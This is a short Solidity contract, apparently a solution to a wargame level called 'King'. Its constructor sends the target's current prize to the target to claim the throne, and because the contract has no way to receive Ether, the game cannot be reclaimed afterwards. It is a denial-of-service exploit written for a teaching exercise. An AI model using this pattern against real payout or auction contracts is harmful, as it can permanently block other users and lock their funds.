// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { King } from "./King.sol";

contract kingslayer {
    constructor(address payable target) payable {
       uint prize = King(target).prize();
       (bool ok,) = target.call{value: prize}("");
       require(ok, "call failed"); 
    }
}
